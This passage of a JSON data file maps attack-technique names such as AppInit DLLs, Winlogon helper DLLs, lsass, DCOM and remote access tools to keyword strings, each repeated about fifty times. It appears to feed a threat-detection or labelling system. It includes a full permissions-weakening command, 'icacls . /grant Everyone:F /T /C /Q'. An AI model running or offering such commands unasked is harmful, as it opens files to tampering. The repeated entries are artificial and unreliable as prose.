        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll",
        "appinit_dll"
    ],
    "exploit public-facing application": [
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject",
        "SQL inject"
    ],
    "remote access tools": [
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        "Team Viewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " TeamViewer ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " VNC ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Ammy ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " Go2Assist ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " LogMeing ",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin",
        " AmmyAdmin"
    ],
    "signed binary proxy execution": [
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf",
        "msiexec, odbcconf"
    ],
    "appcert dlls": [
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        "HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager ",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL",
        " AppCertDLL"
    ],
    "winlogon helper dll": [
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon",
        "winlogon"
    ],
    "file permissions modification": [
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        "chmod ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " attrib +h ",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q",
        " icacls . /grant Everyone:F /T /C /Q"
    ],
    "hooking": [
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "API hooking ",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx",
        "SetWindowsHookEx"
    ],
    "system firmware": [
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS ",
        "UEFI BIOS "
    ],
    "lsass driver": [
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe ",
        "lsass.exe "
    ],
    "distributed component object model": [
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        "COM and execution in same sentence ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " Invoke-DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " DCOM ",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution",
        " COM execution"
